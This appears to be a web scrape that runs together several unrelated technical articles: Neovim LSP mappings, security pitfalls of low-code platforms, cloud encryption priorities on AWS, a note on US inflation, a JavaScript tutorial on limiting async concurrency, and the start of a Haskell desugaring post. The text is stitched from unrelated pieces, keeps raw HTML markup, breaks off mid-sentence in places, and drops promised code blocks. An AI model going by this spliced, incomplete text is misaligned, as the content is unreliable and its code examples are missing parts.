nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span> gD    <span>&lt;</span>cmd<span>&gt;</span>lua <span>vim</span><span>.</span><span>lsp</span><span>.</span>buf<span>.</span><span>implementation</span><span>(</span><span>)</span><span>&lt;</span>CR<span>&gt;</span>

nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span> 1gD   <span>&lt;</span>cmd<span>&gt;</span>lua <span>vim</span><span>.</span><span>lsp</span><span>.</span>buf<span>.</span><span>type_definition</span><span>(</span><span>)</span><span>&lt;</span>CR<span>&gt;</span>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span> <span>gr</span>    <span>&lt;</span>cmd<span>&gt;</span>lua <span>vim</span><span>.</span><span>lsp</span><span>.</span>buf<span>.</span><span>references</span><span>(</span><span>)</span><span>&lt;</span>CR<span>&gt;</span>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span> g0    <span>&lt;</span>cmd<span>&gt;</span>lua <span>vim</span><span>.</span><span>lsp</span><span>.</span>buf<span>.</span><span>document_symbol</span><span>(</span><span>)</span><span>&lt;</span>CR<span>&gt;</span>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span> gW    <span>&lt;</span>cmd<span>&gt;</span>lua <span>vim</span><span>.</span><span>lsp</span><span>.</span>buf<span>.</span><span>workspace_symbol</span><span>(</span><span>)</span><span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>Note that these mappings override some Vim defaults, so in order to ensure they only work on</p>
<p>Awesome! However, unless you have the TypeScript language server already installed, you still won’t notice any LSP features. This is because you need to install the language server. The bad news is that each language server has its own installation instructions. The good news is the nvim-lsp takes care of it by providing a <code>LspInstall</code> command. All we have to do is run:</p>

<p>and we’re in business!</p>
<h3 id="even-more-abstractions">Even more abstractions<a href="#even-more-abstractions" aria-label="even more abstractions permalink"></a></h3>
<p>There are a few other optional plugins for Neovim that will improve your LSP quality-of-life. These are by no means necessary, you could implement them with a bit of Vimscript and Lua, but they do provide some more polish to the experience.</p>
<h4 id="completion-nvim">completion-nvim<a href="#completion-nvim" aria-label="completion nvim permalink"></a></h4>
<p><a href="https://github.com/nvim-lua/completion-nvim">completion-nvim</a>, as the name implies, is an autocompletion plugin. It’s similar to something like <a href="https://github.com/ycm-core/YouCompleteMe">YouCompleteMe</a> or <a href="https://github.com/Shougo/deoplete.nvim">Deoplete</a> in that it gives auto popup and other improvements on top of Neovim’s LSP api, as well as some other sources.</p>
<div data-language="vim"><pre><code><span>call</span> minpac#<span>add</span><span>(</span><span>'nvim-lua/completion-nvim'</span><span>,</span> <span>{</span><span>'type'</span><span>:</span> <span>'opt'</span><span>}</span><span>)</span>

				<p>Over the past 5 years <a href="https://trends.google.com/trends/explore?date=2015-01-01%202020-08-02&amp;q=%2Fg%2F11c6cx4nrr">interest in low-code increased 100 folds</a> according to Google Trends:
<img src="https://cinaq.com/media/low-code-trends.png" alt="Low-code development trends">
This correlates with human psychology eager to optimise for efficiency in everything and building software solutions is no exception. As programming is becoming easier and more accessible, in the future, anyone should be able solve their own information automation challenges. Low-code is a relatively new movement that tries to enable those citizen developers with the right tooling lowering the barrier to build applications without writing traditional code. Because most of my professional experience with low-code is around <a href="https://www.mendix.com/">Mendix</a>, I will use it as reference through out this article.</p>

<p>First computer programs were written in machine code by few experts in the early days. This programming ability felt like a super power to many. Just like the Industrial age boosted the human civilisation, the Information Technology age we are currently in is helping the human race reach new heights. Programming languages are invented or improved to enable more efficient or better programming paradigms. This trend in <a href="https://en.wikipedia.org/wiki/History_of_programming_languages">programming languages timeline</a> is recently leading towards visual programming. In the industry this idea is marked as <a href="https://en.wikipedia.org/wiki/Low-code_development_platform">low-code platforms</a>. To me this is currently the highest programming level because of its high productivity characteristics. Low-code is in a nutshell an unification of deployment and composable building blocks nicely packed to play well together reducing the feedback loop at development and runtime.</p>

<p>The cost of higher abstraction which often correlates with higher productivity is <a href="https://en.wikipedia.org/wiki/High-level_programming_language#Abstraction_penalty">Abstraction penalty</a>. As we move up in the pyramid depicted below, we accomplish more with fewer efforts. That little effort however translates to more execute computing instructions. Due to this fact we loose optimisations and also unaware of the extra assumptions made in between. This problem increases more as applications grow larger and depend on libraries. No matter how well documented the libraries are, they are again abstractions of the actual implementation which might be inaccurate or the user of such library might not know or understand the full extends of the functionalities being leveraged on.</p>
<p><img src="https://cinaq.com/media/low-code-productivity-pyramid.png" alt="Higher programming languages result in higher computational instructions count"></p>

<p>A critical aspect of abstraction penalty is the unawareness of implied behaviours. Citizen developers (Low-code developers) leverage a lot from low-code platform itself; often with insufficient experience and knowledge of the underlaying runtime environment. This is a natural cause because these platforms were designed and promoted  for easy adoption. In the case of Mendix a typical security pitfall is negligence of <a href="https://docs.mendix.com/refguide/access-rules">entity access on attributes level</a>. Developers often focus on getting the program to work, in this particular case, a developer would grant access to all users. No matter the seniority, people make mistakes and forget access rule must be refined. In low-code platform like this, it’s very easy to make mistakes and leave open major security holes.</p>
<p>Platforms like Mendix already has <a href="https://www.mendix.com/evaluation-guide/enterprise-capabilities/security">security covered very well</a>. However with a strong platform, you can still build vulnerable applications because the platform does not know or understand your data risk levels. Therefore the weakest link is your business logic on a low-code platform.</p>
<p><img src="https://cinaq.com/media/low-code-mendix-security.png" alt="Business logic is weakest link with Mendix"></p>
<p>A typical example is: developer gives all access to credit card number attribute in the application model. The developer makes a remark to fine tune the access rules later but forgets to do so. Due to time pressure, testers mostly focussed on the happy use cases which did not reveal the CC information leak.</p>
<p>Therefore it’s crucial to have tooling to help detect these mistakes before they hit production. A tool that could reveal more that meets the eye for developers and testers alike. In Mendix, this would mean bypass the View (from <a href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller">Model View Controller</a>) showing all accessible data and function calls for a given user. There are few challenges here:</p>
<ul>
<li>How to extensively and automatically collect these data</li>
<li>How to make sense of the collected data to identify security weaknesses</li>
<li>Finally a repeatable and preferably incremental method to assess the security risk coverage</li>
</ul>
<p>Often pentest consultants are called in to assess the security risks of low-code applications. However this process is very labor intensive and error prone. As pointed out, higher generation languages like low-code has a bigger attack vector (related to number of computational instructions together with rapid feature building) requires extensive manual work.</p>

<p>In this article we learned low-code is an upcoming trend and it helps companies innovate faster by increasing the productivity of its developers. However, with the higher abstraction levels, it’s also easier to make security mistakes leaving the application vulnerable to attacks. As the citizen developers group grows, we need tooling in place to help identity security risks with the same low threshold as it requires to develop an app on a low-code platform.</p>

August 13, 2020 | https://www.chrisfarris.com/post/cloud-encryption/ | <a href="https://web.archive.org/web/*/https://www.chrisfarris.com/post/cloud-encryption/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>(With apologies for the click-bait headline. It seems to be what all the cool kids are doing when they’re not on TikTok)</p>
<p>I have spent way too much of my life the last three years in the cloud compliance and cloud security posture monitoring space. One of the biggest issues I’ve struggled with is putting a priority on the issue of re-encrypting cloud <em>existing</em> resources.</p>
<p>Let me start off by saying that <strong>you should always check that little box to encrypt at rest</strong>. Because at some point, some one is going to audit your environment and come back with: “this thing isn’t encrypted”. You will then waste more time in meetings with officious people asking when you will encrypt that thing. Save yourself the grief and encrypt now.
<img src="https://www.chrisfarris.com/post/cloud-encryption/RemindYouOfMyLove.png" alt="I will Terminate all your EC2 Instances to remind you of my love"><br>
<em>Da da da dat da dat da da da da ya da<br>
Da da dat dat da ya da!</em></p>
<p>I even made you some scripts to help with <a href="https://github.com/WarnerMedia/aws-fast-fixes/tree/master/s3-bucket-default-encryption">buckets</a> and <a href="https://github.com/WarnerMedia/aws-fast-fixes/tree/master/ebs-encryption">volumes</a>.</p>
<p>So, having said you should always encrypt, this post is about discussing what to do when you discover a cloud resource isn’t encrypted. I will argue that re-encrypting things in the cloud is a high-effort, low-security-value exercise that should be a the bottom of your cloud posture hygiene priority list.</p>
<h2 id="encryption-at-rest">Encryption At Rest</h2>
<p>Lets talk about the value of <strong>Encryption At Rest</strong> in public cloud (and again, I’ll use AWS as my example, but these principles apply to most CSPs).</p>
<p>What threat are you defending against? Obviously, Disclosure is the primary one. Alteration is another. What are the most likely vectors of information disclosure or alteration in the cloud? Is it Ninjas descending on us-east-1a to steal the hard-drives your data is stored on? Or is it Bob in accounting who has an overly-permissioned IAM Key so he can download the AWS bill each month?</p>
<p><strong>Don’t be focusing on encryption before you first have your IAM and account governance houses in order!</strong></p>
<p>It doesn’t matter how much encryption you have on your data. If I provide AWS the right AKIA and 40 character random gobbledygook, Amazon will happily decrypt and hand me your data.</p>
<p>Ok then, besides ninjas, what threats does encryption-at-rest protect against?</p>
<ol>
<li>Cloud Insider Threats - AWS has access to your data. As <a href="https://tidbits.com/2012/04/09/how-to-tell-if-your-cloud-provider-can-read-your-data/">Rich Mogull wrote</a>: “<em>If you can see your data in a Web browser after entering only your account password, the odds are extremely high that your provider can read it as well.</em>” However, there are segregation of duties at AWS, and the person in the S3 team with access to your bits is not the same person who has access to your KMS key. So the S3 engineer would need to meet and conspire with the KMS engineer at the nearby Starbucks and then decide they want to go after <em>your</em> data. Maybe what you have is so valuable it’s worth the risk to them. Perhaps you should keep that shit on-prem.</li>
<li>Bad Code Paths - KMS, even AWS Managed KMS, is tied to your account. Assuming a software bug in the S3 service removed some amount of access controls, KMS access controls <em>might</em> prevent the decryption of the data. As far as anyone knows this has never happened, but it’s not outside the realm of possibility.</li>
<li>Poor Cloud Hygiene - If you have an EBS Volume that is encrypted, and you snapshot that volume and accidentally share it to the world, access to the KMS key would be required to hydrate that snapshot into a volume in an adversary’s account. However if you have such crappy cloud hygiene, you’re probably also not encrypting things consistently, so focus on fixing the hygiene and stop having myopic focus on encryption.</li>
<li>Encryption-in-Transit in the hypervisor-plane - <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html">AWS documentations states</a> that EBS encrypt/decrypt operations happen in the hypervisor of the compute node (not on the node where the volume is stored). As a result, the EBS I/O is encrypted when going across that back-end AWS network.</li>
</ol>
<h4 id="types-of-kms">Types of KMS</h4>
<p>AWS has three types of Customer Managed Keys (CMK), where the last one comes in two flavors:</p>
<ol>
<li><a href="https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html#aws-owned-cmk">AWS Owned CMK</a> - this seems like a oxymoron “AWS Managed Customer Managed Key”. These keys are used by AWS for services across multiple accounts</li>
<li><a href="https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html#aws-managed-cmk">AWS Managed CMK</a> - are in your account, but AWS manages the resource policy, not the customer.</li>
<li><a href="https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html#customer-cmk">Customer managed CMKs</a> - another silly named key - Customer Managed Customer Managed Key. Here you as the key owner can manage the resource policy and control who can use the key and in what ways.</li>
<li><a href="https://docs.aws.amazon.com/kms/latest/developerguide/importing-keys.html">Customer Provided</a> Customer managed CMKs - With these Customer managed CMKs, AWS does not generate the master key material. It is created by you and imported into the KMS service. Here is the $65 million dollar warning though: <em>“In the unlikely event of certain regionwide failures that affect the service (such as a total loss of power), AWS KMS cannot automatically restore your imported key material."</em></li>
</ol>

<p>AWS Owned CMKs exist to check a box on a compliance spreadsheet. Luckily most cases this encrpytion is enabled by default.</p>
<p>AWS Managed CMKs might protect against the “Bad Code Paths” threat outlined above, while also checking a box on a spreadsheet.</p>
<p>Customer Managed CMKs do provide an extra level of security if you’re IAM and/or account governance is a mess. But defining a resource policy on a specific CMK, you can prevent other IAM Principals in the account from using that key for specific decrypt operations. This is important when you have large multi-tenant accounts due to poor application separation.</p>
<p>Customer Provided CMKs are a bad idea. If you need that you should stay on-prem. Otherwise you need to regularly test your procedures for extracting the key material from your on-prem vault and re-importing it into AWS. Because if there is a disaster with KMS, you are completely dead in the water till that is done.</p>
<h4 id="the-cost-of-re-encrypting">The cost of re-encrypting</h4>
<p>If you didn’t heed my initial advice and you did create a data store without enabling encryption at rest, what do you do?</p>
<p>For EBS volumes, you need to:</p>
<ol>
<li>Stop your instance</li>
<li>create a snapshot</li>
<li>create a new volume (with encryption)</li>
<li>attach new volume to a new instance</li>
<li>Start instance</li>
<li><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-initialize.html">Suffer performance impacts</a> till all the blocks are copied from the snapshot to the volume on read.</li>
</ol>
<p>(<a href="https://github.com/jchrisfarris/aws_scripts/blob/master/bin/encrypt_all_volumes.py">here is a script</a> I wrote three years ago when a cloud migration failed to do the right thing in terraform.)</p>
<p>For S3, you’ll need to copy each S3 Object and re-encrypt. <a href="https://aws.amazon.com/blogs/storage/encrypting-objects-with-amazon-s3-batch-operations/">AWS Batch Operations</a> can help there. But for a large enough volume of data, you’ll incur some costs. PutObject operations aren’t cheap at scale.</p>
<p>RDS also requires taking a snapshot, encrypting the snapshot when you copy it, then launching a new RDS from the encrypted snapshot. <a href="https://cintia.me/blog/post/lazy-rds/">With another performance impact</a>.</p>
<p><strong>The issue here is: “Is this worth it?” - The production downtime, performance impacts, lost time on the sprint that could be delivering business value or fixing the AppSec issues?</strong></p>
<h2 id="encryption-in-transit">Encryption in Transit</h2>
<p><a href="https://docs.aws.amazon.com/general/latest/gr/aws-general.pdf#aws-service-information">All AWS services support TLS Endpoints</a> and if you’re using the SDKs the <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/reference/core/session.html#boto3.session.Session.client">default behavior</a> is to use the https endpoint. This means that most of your serverless applications get encrypt-in-transit out of the box. API Gateway invoking a lambda, which calls out to Lex is all encrypted-in-transit (with identity as the perimeter too).</p>
<p>Additionally, ACM makes it dirt-simple to drop a custom TLS Cert on your load balancer or CloudFront (which is how this site is https://).</p>
<p>Where you run into problems is when you’re inside of the VPC. Virtual Private Cloud does not mean virtual encrypted cloud. There is no encryption of traffic inside your VPC.</p>
<p>Your VPC exists across multiple AZs which means it also exists across multiple buildings. Traffic between instances across AZs travels unencrypted across metro areas. If your threat model includes adversaries that can compel warrantless wiretaps, you need to focus on intra-VPC Encryption. If that’s not your adversarial threat model go back and look at your other cloud hygiene issues first.</p>
<p>All that said, intra-VPC Encryption-in-Transit is undifferentiated heavy lifting. Managing keys on instances and containers is added complexity that interferes with builders. <strong>AWS should provide KMS support on ENIs for all intra-VPC traffic.</strong> [<a href="#edit-1">edit-1</a>]</p>
<h2 id="conclusion">Conclusion</h2>
<p>When evaluating your cloud security posture priorities, <strong>encryption should be at the bottom of your list.</strong> Yes, you should <a href="https://aws.amazon.com/premiumsupport/knowledge-center/ebs-automatic-encryption">enable Default EBS encryption</a>, and then enable <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/bucket-encryption.html">Default S3 encryption</a> on all your S3 Buckets.</p>
<p>But first get your IAM house in order. Get rid of IAM users and figure out least-privilege identity federation. Fix your InstanceProfile or Lambda policies so you’re not <a href="https://krebsonsecurity.com/tag/capital-one-breach/">the next CapitalOne</a>.</p>
<p>Fix those Launch Wizards that are open to the world. Close your S3 buckets, and turn on CloudTrail FFS!</p>
<p>Make sure you’re leveraging organizations to effectively protect your accounts from outside the account (via SCPs). Operationalize GuardDuty and IAM Access Analyzer. Pay attention to your AppSec, since those SSRFs are how you’re leaking keys to the world.</p>
<p>Once you’ve done all that, then consider re-encrypting the cloud resources you missed encrypting on creation.</p>
<h5 id="edit-1">Edit 1</h5>
<p>2020-Aug-3 @0710 EDT - In a slack discussion with <a href="https://summitroute.com/">Scott Piper</a> after this was published, he led me to some docs that show some ENIs do support transparent encryption. However the instance types are quite limited, and NAT and Transit gateways aren’t supported. <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/data-protection.html#encryption-transit">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/data-protection.html#encryption-transit</a></p>
<p>Additionally AWS states (emphasis mine):</p>
<blockquote>
<p><em>All data flowing across the AWS global network that interconnects our datacenters and regions <strong>is automatically encrypted at the physical layer before it leaves our secured facilities</strong>. Additional encryption layers exist as well; for example, all VPC cross-region peering traffic, and customer or service-to-service TLS connections.</em>(<a href="https://aws.amazon.com/security/">link</a>)</p>

<p>Well, The Federal Reserve finally got its wish: INFLATION!</p>



<p><em>U.S. consumer prices&nbsp;rose&nbsp;in July by more than expected on a bounce in auto and apparel costs. <strong>The so-called core figure, which excludes volatile food and fuel costs, climbed 0.6% from the prior month, the biggest surge in almost three decades</strong>, according to a Labor Department report Wednesday. The headline figure also increased 0.6%, following the same gain in June. The trend reflects a rebound in demand for goods and services from the depths of the pandemic-induced lockdowns earlier this year</em>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>Today's post is about a little trick I have learned about 2years ago, and that I have since used numerous times in short Node.js scripts I had to write.<br>
It really isn't much, but I guess it may be helpful to others, and probably is an alright first JavaScript post on this blog.</p>
<blockquote>
<p>Say one has a list of things, and for every of these things, one needs to perform an asynchronous operation that returns a Promise, and be notified when all operations have been performed.<br>
How does one limit the number of asynchronous operations being performed conccurently? Without 3rd party dependencies and just a few lines of code?</p>
</blockquote>
<p>Are you seeing the problem yet? Let's build some context:</p>
<h3 id="we-have-a-list-of-99-things%2C-say-resource-identifiers">We have a list of 99 things, say resource identifiers <a href="#we-have-a-list-of-99-things%2C-say-resource-identifiers">#</a></h3>
<pre><code><span>const</span> ids <span>=</span> Array<span>.</span><span>from</span><span>(</span><span>Array</span><span>(</span><span>99</span><span>)</span><span>,</span> <span>(</span><span>_<span>,</span> i</span><span>)</span> <span>=&gt;</span> i <span>+</span> <span>1</span><span>)</span><span>;</span><br><span>&gt;</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>...</span> <span>99</span><span>]</span></code></pre>
<h3 id="for-each-of-these-things%2C-we-need-to-perform-an-asynchronous-operation">For each of these things, we need to perform an asynchronous operation <a href="#for-each-of-these-things%2C-we-need-to-perform-an-asynchronous-operation">#</a></h3>
<p>First, let's define the function that will perform said asynchronous operation:</p>
<pre><code><br><br><span>function</span> <span>performAsyncOperation</span><span>(</span><span>id</span><span>)</span> <span>{</span><br>  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve</span><span>)</span> <span>=&gt;</span> <span>{</span><br>    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><br>      console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>Performed operation for resource </span><span><span>${</span>id<span>}</span></span><span>.</span><span>`</span></span><span>)</span><span>;</span><br>      <span>resolve</span><span>(</span><span>)</span><span>;</span><br>    <span>}</span><span>,</span> <span>300</span><span>)</span><span>;</span><br>  <span>}</span><span>)</span><span>;</span><br><span>}</span></code></pre>
<p>Now, we know that we need to call this function of every single thing out of our list of 99 things, every resource id we have in <code>ids</code>.<br>
Our first approach, would be to naively use <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/Array/map">Array.prototype.map</a> and <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/Promise/all">Promise.all</a> and call it a day. But let's have a closer look to this innocent line of code and its implications:</p>
<pre><code><span>await</span> Promise<span>.</span><span>all</span><span>(</span>ids<span>.</span><span>map</span><span>(</span>performAsyncOperation<span>)</span><span>)</span><span>;</span><br>console<span>.</span><span>log</span><span>(</span><span>'All operations performed, moving on to something else now.'</span><span>)</span><span>;</span></code></pre>
<p><em>Note: we might arguably use <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled">Promise.allSettled</a> in a real world scenario, but let's assume our asynchronous operations cannot fail.</em></p>
<p>Which we would give us the following complete script:</p>
<pre><code><span>function</span> <span>performAsyncOperation</span><span>(</span><span>id</span><span>)</span> <span>{</span><br>  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve</span><span>)</span> <span>=&gt;</span> <span>{</span><br>    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><br>    console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>Performed operation for resource </span><span><span>${</span>id<span>}</span></span><span>.</span><span>`</span></span><span>)</span><span>;</span><br>    <span>resolve</span><span>(</span><span>)</span><span>;</span><br>    <span>}</span><span>,</span> <span>300</span><span>)</span><span>;</span><br>  <span>}</span><span>)</span><span>;</span><br><span>}</span><p><span>async</span> <span>function</span> <span>run</span><span>(</span><span>)</span> <span>{</span><br>  <span>const</span> start <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>;</span><br>  <span>const</span> ids <span>=</span> Array<span>.</span><span>from</span><span>(</span><span>Array</span><span>(</span><span>99</span><span>)</span><span>,</span> <span>(</span><span>_<span>,</span> i</span><span>)</span> <span>=&gt;</span> i <span>+</span> <span>1</span><span>)</span><span>;</span></p><p>  <span>await</span> Promise<span>.</span><span>all</span><span>(</span>ids<span>.</span><span>map</span><span>(</span>performAsyncOperation<span>)</span><span>)</span><span>;</span><br>  <span>const</span> end <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>;</span><br>  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>All operations performed in </span><span><span>${</span>end <span>-</span> start<span>}</span></span><span>ms, moving on to something else now.</span><span>`</span></span><span>)</span><span>;</span><br><span>}</span></p><p><span>run</span><span>(</span><span>)</span><span>;</span></p></code></pre>
<p>Now, let's run it:</p>
<pre><code>$ node async-operations-promise-all.js
</code></pre>
<pre><code>[tim@praxis ~]$ node limit-async.js 
Performed operation for resource 1.
Performed operation for resource 2.
Performed operation for resource 3.
...
Performed operation for resource 97.
Performed operation for resource 98.
Performed operation for resource 99.
All operations performed in 338ms, moving on to something else now.
</code></pre>
<p>As we can see, ~all the asynchronous operations were performed <strong>concurrently</strong>, and sometimes, that's perfectly fine and exactly what we want.</p>
<p><em>Note: <code>Promise.all</code> only waits for all the <code>Promise</code>s to be resolved. The actual asynchronous operation is triggered by the function call from <code>Array.prototype.map</code>, creating a new <code>Promise</code> on each call.</em></p>
<h3 id="the-problem-of-performing-operations-concurrently">The problem of performing operations concurrently <a href="#the-problem-of-performing-operations-concurrently">#</a></h3>
<p>Now, let's assume that our <code>performAsyncOperation</code> really performs an HTTP request, an API Call, a database query, or really anything else that would either suffer or punish us for the load we push on to it. It might be a rate-limited API, or a fragile host.</p>
<p><em>Note: in the actual case of an HTTP request, or database query, the Web/Node.js/etc... API being used will already probably limit concurrency, of which value may or may not configurable, but let's assume that we cannot or do not want to change such settings.</em></p>
<p>In such cases, we simply cannot allow our script to perform all these operations concurrently, as it risks getting our API key revoked, our IP blocked, or the target host/database responding unreliably, etc... Thus we will be searching for a way to limit this concurrency to avoid such scenario.</p>
<p><em>Note: depending on the actual work performed by the asynchronous operation, performing many of these concurrently may also make the process running it consuming significant amount of CPU and/or memory resources on the machine it runs.</em></p>
<h3 id="a-solution%3A-performing-asynchronous-operations-sequentially">A solution: performing asynchronous operations sequentially <a href="#a-solution%3A-performing-asynchronous-operations-sequentially">#</a></h3>
<p>The first solution that may come to mind, would be to perform each of these operations <strong>sequentially</strong>:</p>
<pre><code><span><span>async</span> <span>function</span> <span>run</span><span>(</span><span>)</span> <span>{</span></span><br><span>  <span>const</span> start <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>;</span></span><br><span>  <span>const</span> ids <span>=</span> Array<span>.</span><span>from</span><span>(</span><span>Array</span><span>(</span><span>99</span><span>)</span><span>,</span> <span>(</span><span>_<span>,</span> i</span><span>)</span> <span>=&gt;</span> i <span>+</span> <span>1</span><span>)</span><span>;</span></span><br><span></span><br><del>  <span>-</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span>ids<span>.</span><span>map</span><span>(</span>performAsyncOperation<span>)</span><span>)</span><span>;</span></del><br><ins>  <span>+</span> <span>for</span> <span>(</span><span>const</span> id <span>of</span> ids<span>)</span> <span>{</span></ins><br><ins>  <span>+</span>   <span>await</span> <span>performAsyncOperation</span><span>(</span>id<span>)</span><span>;</span></ins><br><ins>  <span>+</span> <span>}</span></ins><br><span>  <span>const</span> end <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>;</span></span><br><span>  console<span>.</span><span>log</span><span>(</span><span><span>`</span><span>All operations performed in </span><span><span>${</span>end <span>-</span> start<span>}</span></span><span>ms, moving on to something else now.</span><span>`</span></span><span>)</span><span>;</span></span><br><span><span>}</span></span></code></pre>
<p>Which, if we run this script, gives the following output:</p>
<pre><code>[tim@praxis ~]$ node limit-async.js 
Performed operation for resource 1.
Performed operation for resource 2.
Performed operation for resource 3.
...
Performed operation for resource 97.
Performed operation for resource 98.
Performed operation for resource 99.
All operations performed in 29825ms, moving on to something else now.
</code></pre>
<p>As we'd expect, every operation awaits for the previous one to be completed, and, in a way, we found a succesful solution to our problem.<br>
However, one would probably argue this being far from optimal, and that the system against which we run these asynchronous operations can safely withstand up to 3 concurrent operations, thus, our script could theoretically be ~3 times faster.</p>
<h3 id="the-solution%3A-limiting-concurrency-using-workers">The solution: limiting concurrency using workers <a href="#the-solution%3A-limiting-concurrency-using-workers">#</a></h3>
<p>Now, let's take a look at how we can update our script to perform at most 3 operations concurrently.<br>
For that, let's introduce a <code>worker</code> function, to which we will delegate the job of performing one asynchronous operation at a time.</p>
<pre><code><span>const</span> <span>worker</span> <span>=</span> <span>next_</span> <span>=&gt;</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><br>  <span>let</span> next<span>;</span><br>  <span>while</span> <span>(</span><span>(</span>next <span>=</span> <span>next_</span><span>(</span><span>)</span><span>)</span><span>)</span> <span>{</span><br>    <span>await</span> <span>performAsyncOperation</span><span>(</span>next<span>)</span><span>;</span><br>  <span>}</span><br><span>}</span><span>;</span></code></pre>
<p><em>Note: such a <code>worker</code> function can be implemented in various ways, this implementation is just an example of what I've used in the past.</em></p>
<p>However big the number of asynchronous operations we wish to perform, we will ever need at most, 3 concurrent <code>workers</code>.</p>
<pre><code><span>const</span> <span>CONCURRENT_WORKERS</span> <span>=</span> <span>3</span><span>;</span></code></pre>
<p>We will then want to give a way to our <code>workers</code> to retrieve the next resource identifier, or thing, to perform the asynchronous operation from.</p>
<pre><code><span>const</span> workers <span>=</span> <span>[</span><span>]</span><span>;</span><br><span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>CONCURRENT_WORKERS</span><span>;</span> i<span>++</span><span>)</span> <span>{</span><br>  <span>const</span> w <span>=</span> <span>worker</span><span>(</span>ids<span>.</span><span>pop</span><span>.</span><span>bind</span><span>(</span>ids<span>)</span><span>)</span><span>;</span><br>  workers<span>.</span><span>push</span><span>(</span><span>w</span><span>(</span>ids<span>)</span><span>)</span><span>;</span><br><span>}</span></code></pre>
<p>Let us update our script:</p>

<p>And run it:</p>

<h3 id="bonus-solution%3A-batching-concurrent-operations">Bonus solution: batching concurrent operations <a href="#bonus-solution%3A-batching-concurrent-operations">#</a></h3>
<p>There's one more way to look at the problem, and reach another solution: splitting the asynchronous operations to be performed in <strong>batches</strong>.<br>
In our case, if we have 99 operations to perform, we can split these into 33 batches of 3 operations.<br>
With batching, every operation within one batch will be performed conccurently, and the next batch will only be started once the previous one is finished.<br>
How does one implement concurrent operations batching with JavaScript?</p>

<h3 id="conclusion">Conclusion <a href="#conclusion">#</a></h3>
<p>Asynchronous JavaScript can be tricky, and though one may argue the language lacks high-level APIs to deal more efficiently with some of these tricky cases like the one we've just covered, it's always worth taking our chance at solving the problems leveraging the features that we're provided by the language.</p>
<p>In this post we've built and lived through a common scenario of managing asynchronous operations concurrency in JavaScript, along with a common pitfall associated with a naive approach, as well as an intermediary solution that is also very useful on some other cases, and finally the optimal solution for dealing with this problem, all without using third party modules. I hope this may be useful to some of you, and that I did not take too many shortcuts in the process.</p>
<p>If you liked this post, feel free to encourage me by saying so on <a href="https://twitter.com/tpillard">my Twitter</a> and/or by liking/retweeting the associated tweet or sharing the article around you.<br>
If, on the contrary, you did not like this post and think I should never write JavaScript and/or on a public medium again, keep it to yourself dude, I know already.<br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This article is based on <a href="https://www.youtube.com/watch?v=fty9QL4aSRc">my talk with the same title</a>, which I gave at the Haskell Love conference in 2020, where I give a cursory overview of GHC’s front-end pipeline, the internal Core language, and the desugaring pass.</em></p><p>Haskell is an expressive language with many features. On the one hand, it makes Haskell convenient, equipping the programmer with a rich arsenal of tools to get the job done and write high-quality software. On the other hand, developing a thorough understanding of these tools, of all the language features, takes time, effort, and experience.</p><p>One way to build an intuition for a language feature is to use it. Practice makes perfect, and by trial and error, you can discover the ins and outs of using certain parts of the language. However, the knowledge acquired this way may be superficial, and the mental model will only be as good as it was needed for the tasks at hand.</p><p>Deeper insight comes from a different perspective: you need to decompose a concept into its basic constituents. For example, what are multi-argument functions? In a curried language, we know that <code>\a b c -&gt; ...</code> is much the same as <code>\a -&gt; \b -&gt; \c -&gt; ...</code>. Thus we have reduced the concept of a multi-argument function into a simpler concept of a single-argument function.</p><p>For a more involved example: what is <code>do</code>-notation? To grasp it, you need to think about how it is desugared into <code>&gt;&gt;=</code> and <code>&gt;&gt;</code> (and also <code>&lt;*&gt;</code> with <code>-XApplicativeDo</code>).</p><p>What about infix operators, if-then-else expressions, list comprehensions, type classes, type families, GADTs? How much Haskell is essential, and how much is sugar on top?</p><p>This becomes clear if we start thinking about the way Haskell programs are desugared into GHC’s Core: a small, elegant language, used as an intermediate representation in GHC’s compilation pipeline. The many features of Haskell are reducible to the few constructs of Core.</p><p>Desugaring translates a program that uses many different language constructs into a program that uses only a few.</p><p>For example, consider this snippet:</p><pre><code><span>product</span> [a + b, c + d]
</code></pre><p>It uses several Haskell features:</p><ol>
<li>Lists literals: <code>[a, b, c, ...]</code></li>
<li>Operator application: <code>x # y</code></li>
